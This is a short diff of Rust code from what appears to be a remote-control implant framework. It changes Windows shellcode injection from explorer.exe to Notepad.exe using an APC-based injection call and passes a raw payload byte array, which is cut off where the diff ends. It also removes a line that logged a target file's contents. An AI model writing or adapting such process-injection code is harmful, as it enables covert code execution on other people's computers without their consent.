@@ -28,10 +28,6 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
         file_agent.current_directory().await?.to_string_lossy()
     );
     info!("files at \"/\": {:?}", file_agent.list("/".into()).await?);
-    info!(
-        "Cargo.toml: \"{}\"",
-        String::from_utf8_lossy(&file_agent.read("Cargo.toml".into()).await?)
-    );
     info!("target shell: {:?}", shell);
 
     if platform == TargetPlatform::Linux && platform == TargetPlatform::MacOS {
@@ -52,10 +48,11 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     }
 
     if platform == TargetPlatform::Windows {
-        info!("injecting shellcode into explorer.exe");
+        let pid = process_agent.id_by_name("Notepad.exe".to_string()).await?;
+        info!("injecting shellcode into {:X}", pid);
         process_agent
-            .inject_shellcode_by_id(
-                process_agent.id_by_name("explorer.exe".to_string()).await?,
+            .inject_shellcode_by_id_apc(
+                pid,
                 vec![
                     0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff,
                     0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
